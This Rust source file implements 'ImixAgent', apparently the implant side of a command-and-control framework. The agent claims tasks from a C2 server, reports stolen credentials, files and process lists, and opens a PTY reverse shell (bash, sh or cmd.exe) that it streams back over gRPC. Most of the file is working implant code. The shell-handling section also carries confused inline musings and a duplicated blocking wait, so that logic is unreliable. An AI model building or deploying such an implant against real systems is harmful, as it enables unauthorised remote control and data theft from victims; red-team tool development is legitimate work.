use anyhow::{Context, Result};
use eldritch_libagent::agent::Agent;
use pb::c2::{self, ClaimTasksRequest};
use pb::config::Config;
use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};
use tokio::sync::RwLock;
use transport::Transport;

use crate::task::TaskRegistry;

// Deps for reverse_shell_pty
use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
#[cfg(not(target_os = "windows"))]
use std::path::Path;
use tokio::sync::mpsc::error::TryRecvError;

pub struct ImixAgent<T: Transport> {
    config: RwLock<Config>,
    transport: RwLock<T>,
    runtime_handle: tokio::runtime::Handle,
    pub task_registry: TaskRegistry,
    pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
}

impl<T: Transport + 'static> ImixAgent<T> {
    pub fn new(
        config: Config,
        transport: T,
        runtime_handle: tokio::runtime::Handle,
        task_registry: TaskRegistry,
    ) -> Self {
        Self {
            config: RwLock::new(config),
            transport: RwLock::new(transport),
            runtime_handle,
            task_registry,
            subtasks: Arc::new(Mutex::new(BTreeMap::new())),
        }
    }

    pub fn get_callback_interval_u64(&self) -> u64 {
        // Blocks on read, but it's fast
        if let Ok(cfg) = self.config.try_read() {
            cfg.info.as_ref().map(|b| b.interval).unwrap_or(5)
        } else {
            5
        }
    }

    // Helper to fetch tasks and return them, so main can spawn
    pub async fn fetch_tasks(&self) -> Result<Vec<pb::c2::Task>> {
        let mut transport = self.transport.write().await;
        let beacon_info = self.config.read().await.info.clone();
        let req = ClaimTasksRequest {
            beacon: beacon_info,
        };
        let response = transport
            .claim_tasks(req)
            .await
            .context("Failed to claim tasks")?;
        Ok(response.tasks)
    }

    // Helper to run a future on the runtime handle, blocking the current thread.
    fn block_on<F, R>(&self, future: F) -> Result<R, String>
    where
        F: std::future::Future<Output = Result<R, String>>,
    {
        self.runtime_handle.block_on(future)
    }
}

// Implement the Eldritch Agent Trait
impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            // Transport uses std::sync::mpsc::Sender for fetch_asset
            let (tx, rx) = std::sync::mpsc::channel();
            t.fetch_asset(req, tx).await.map_err(|e| e.to_string())?;

            let mut data = Vec::new();
            while let Ok(resp) = rx.recv() {
                data.extend(resp.chunk);
            }
            Ok(data)
        })
    }

    fn report_credential(
        &self,
        req: c2::ReportCredentialRequest,
    ) -> Result<c2::ReportCredentialResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            t.report_credential(req).await.map_err(|e| e.to_string())
        })
    }

    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            // Transport uses std::sync::mpsc::Receiver for report_file
            let (tx, rx) = std::sync::mpsc::channel();
            tx.send(req).map_err(|e| e.to_string())?;
            drop(tx);
            t.report_file(rx).await.map_err(|e| e.to_string())
        })
    }

    fn report_process_list(
        &self,
        req: c2::ReportProcessListRequest,
    ) -> Result<c2::ReportProcessListResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            t.report_process_list(req).await.map_err(|e| e.to_string())
        })
    }

    fn report_task_output(
        &self,
        req: c2::ReportTaskOutputRequest,
    ) -> Result<c2::ReportTaskOutputResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            t.report_task_output(req).await.map_err(|e| e.to_string())
        })
    }

    fn reverse_shell(&self) -> Result<(), String> {
        Err("Reverse shell not implemented in imixv2 agent yet".to_string())
    }

    fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
        let subtasks = self.subtasks.clone();

        // We need to clone the transport to move it into the spawned task.
        // Since we are in a synchronous context, we use block_on to acquire the async lock.
        let transport_clone = self.block_on(async {
            let guard = self.transport.read().await;
            Ok(guard.clone())
        })?;

        let handle = self.runtime_handle.spawn(async move {
            let mut transport = transport_clone;
            // Yes, `UnsafeTransport` (and thus `Transport`) methods take `&mut self`.

            #[cfg(debug_assertions)]
            log::info!("starting reverse_shell_pty (task_id={})", task_id);

            // Channels to manage gRPC stream
            let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
            let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(1);
            let (exit_tx, mut exit_rx) = tokio::sync::mpsc::channel(1);

            // First, send an initial registration message
            if let Err(_err) = output_tx
                .send(ReverseShellRequest {
                    task_id,
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: Vec::new(),
                })
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("failed to send initial registration message: {}", _err);
            }

            // Use the native pty implementation for the system
            let pty_system = native_pty_system();

            // Create a new pty
            let pair = match pty_system.openpty(PtySize {
                rows: 24,
                cols: 80,
                pixel_width: 0,
                pixel_height: 0,
            }) {
                Ok(p) => p,
                Err(e) => {
                     #[cfg(debug_assertions)]
                     log::error!("failed to open pty: {}", e);
                     return;
                }
            };

            // Spawn command into the pty
            let cmd_builder = match cmd {
                Some(c) => CommandBuilder::new(c),
                None => {
                    #[cfg(not(target_os = "windows"))]
                    {
                        if Path::new("/bin/bash").exists() {
                            CommandBuilder::new("/bin/bash")
                        } else {
                            CommandBuilder::new("/bin/sh")
                        }
                    }
                    #[cfg(target_os = "windows")]
                    CommandBuilder::new("cmd.exe")
                }
            };

            let mut child = match pair.slave.spawn_command(cmd_builder) {
                Ok(c) => c,
                Err(e) => {
                     #[cfg(debug_assertions)]
                     log::error!("failed to spawn command: {}", e);
                     return;
                }
            };

            let mut reader = match pair.master.try_clone_reader() {
                 Ok(r) => r,
                 Err(e) => {
                      #[cfg(debug_assertions)]
                      log::error!("failed to clone reader: {}", e);
                      return;
                 }
            };
            let mut writer = match pair.master.take_writer() {
                 Ok(w) => w,
                 Err(e) => {
                      #[cfg(debug_assertions)]
                      log::error!("failed to take writer: {}", e);
                      return;
                 }
            };

            // Spawn task to send PTY output
            const CHUNK_SIZE: usize = 1024;
            tokio::spawn(async move {
                loop {
                    let mut buffer = [0; CHUNK_SIZE];
                    let n = match reader.read(&mut buffer[..]) {
                        Ok(n) => n,
                        Err(_err) => {
                            #[cfg(debug_assertions)]
                            log::error!("failed to read pty: {}", _err);
                            break;
                        }
                    };

                    if n < 1 {
                        match exit_rx.try_recv() {
                            Ok(None) | Err(TryRecvError::Empty) => {}
                            Ok(Some(_status)) => {
                                #[cfg(debug_assertions)]
                                log::info!("closing output stream, pty exited: {}", _status);
                                break;
                            }
                            Err(TryRecvError::Disconnected) => {
                                #[cfg(debug_assertions)]
                                log::info!("closing output stream, exit channel closed");
                            }
                        }
                        continue;
                    }

                    if let Err(_err) = output_tx
                        .send(ReverseShellRequest {
                            kind: ReverseShellMessageKind::Data.into(),
                            data: buffer[..n].to_vec(),
                            task_id,
                        })
                        .await
                    {
                        #[cfg(debug_assertions)]
                        log::error!("reverse_shell_pty output failed to queue: {}", _err);
                        break;
                    }

                    // Ping to flush
                    if let Err(_err) = output_tx
                        .send(ReverseShellRequest {
                            kind: ReverseShellMessageKind::Ping.into(),
                            data: Vec::new(),
                            task_id,
                        })
                        .await
                    {
                        #[cfg(debug_assertions)]
                        log::error!("reverse_shell_pty ping failed: {}", _err);
                        break;
                    }
                }
            });

            // Initiate gRPC stream
            if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
                 #[cfg(debug_assertions)]
                 log::error!("transport.reverse_shell failed: {}", e);
                 // Should we kill child?
                 let _ = child.kill();
                 return;
            }

            // Handle Input
            loop {
                if let Ok(Some(_status)) = child.try_wait() {
                    #[cfg(debug_assertions)]
                    log::info!("closing input stream, pty exited: {}", _status);
                    break;
                }

                if let Some(msg) = input_rx.recv().await {
                    if msg.kind == ReverseShellMessageKind::Ping as i32 {
                        continue;
                    }
                    if let Err(_err) = writer.write_all(&msg.data) {
                        #[cfg(debug_assertions)]
                        log::error!("reverse_shell_pty failed to write input: {}", _err);
                    }
                } else {
                    let _ = child.kill();
                    break;
                }
            }

            let _ = child.wait().and_then(|status| {
                // Sending exit status to exit_tx requires async send, but we are in async block.
                // But exit_tx is captured by the other task!
                // Wait, exit_tx is Sender. exit_rx is Receiver.
                // The output task holds exit_rx.
                // This task holds exit_tx.
                // Yes.
                // We need to send exit status to signal output task to stop reading if n < 1.
                // Wait, logic in output task: `exit_rx.try_recv()`.
                // So we send here.
                Ok(status) // We can't await inside and_then closure effectively if we want to use status
            });
            // We need to send status.
            let status = child.wait().ok(); // Block? child.wait() is blocking?
            // portable-pty child.wait() is blocking.
            // But we are in async task!
            // This blocks the executor thread?
            // `portable-pty` operations are generally blocking.
            // Ideally we should use `spawn_blocking` for blocking ops.
            // But the loop above `child.try_wait()` polls.
            // `child.wait()` blocks.
            // If `try_wait` returned Some, then `wait` returns immediately.
            // If `input_rx` closed (else branch), we killed child. `wait` returns.

            if let Some(s) = status {
                 let _ = exit_tx.send(Some(s)).await;
            }

            #[cfg(debug_assertions)]
            log::info!("stopping reverse_shell_pty (task_id={})", task_id);
        });

        // Store handle
        if let Ok(mut map) = subtasks.lock() {
            map.insert(task_id, handle);
        }

        Ok(())
    }

    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
        self.block_on(async {
            let mut t = self.transport.write().await;
            t.claim_tasks(req).await.map_err(|e| e.to_string())
        })
    }

    fn get_transport(&self) -> Result<String, String> {
        Ok("grpc".to_string())
    }

    fn set_transport(&self, _transport: String) -> Result<(), String> {
        Err("Switching transport not supported yet".to_string())
    }

    fn add_transport(&self, _transport: String, _config: String) -> Result<(), String> {
        Err("Adding transport not supported yet".to_string())
    }

    fn list_transports(&self) -> Result<Vec<String>, String> {
        Ok(vec!["grpc".to_string()])
    }

    fn get_callback_interval(&self) -> Result<u64, String> {
        Ok(self.get_callback_interval_u64())
    }

    fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = &mut cfg.info {
                info.interval = interval;
            }
            Ok(())
        })
    }

    fn list_tasks(&self) -> Result<Vec<c2::Task>, String> {
        Ok(self.task_registry.list())
    }

    fn stop_task(&self, task_id: i64) -> Result<(), String> {
        self.task_registry.stop(task_id);
        // Also stop subtask
        let mut map = self.subtasks.lock().map_err(|_| "Poisoned lock".to_string())?;
        if let Some(handle) = map.remove(&task_id) {
             handle.abort();
             #[cfg(debug_assertions)]
             log::info!("Aborted subtask {}", task_id);
        }
        Ok(())
    }
}
